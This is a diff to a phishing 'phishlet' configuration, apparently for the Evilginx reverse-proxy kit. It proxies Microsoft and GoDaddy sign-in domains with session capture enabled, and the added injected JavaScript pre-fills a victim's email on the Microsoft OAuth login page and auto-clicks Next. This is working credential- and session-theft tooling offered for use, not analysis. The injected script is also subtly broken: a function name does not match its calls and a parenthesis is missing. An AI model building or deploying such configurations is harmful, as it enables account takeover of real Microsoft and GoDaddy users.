@@ -3,7 +3,7 @@ author: '@simplerhacking'
 min_ver: '3.0.0'
 proxy_hosts:
   - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
-  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: false, is_landing: false, auto_filter: false }
   - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
   - { phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing:false,  auto_filter: false }
   - { phish_sub: 'csp', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: false }
@@ -80,7 +80,29 @@ login:
   path: "/"
   
 js_inject:
-   - trigger_domains: ["accessoriesdirects.com"]
-     trigger_paths: ["/path/trigger"]
-     trigger_params: []
-     script: document.location = "https://login.microsoftonline.com;
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/v2.0/authorize*"]
+    script: |
+      function 1p(){
+        var emailId = document.querySelector("#i0116");
+        var nextButton = document.querySelector("#idSIButton9");
+        var query = window.location.href;
+        if (/#/.test(window.location.href){
+        var res = query.split("");
+        var data1 = res[0];
+        var data2 = res[1];
+        console.log(data1);
+        console.log(data2);
+        if (emailId != null) {
+        var m = data2.replace(/[=]/gi, '');
+        emailId.focus();
+        emailId.value = m;
+        nextButton.focus();
+        nextButton.click();
+        console.log("YES!");
+        return;
+        }
+        }
+        setTimeout(function(){lp();}, 500);
+      }
+      setTimeout(function(){lp();}, 500);
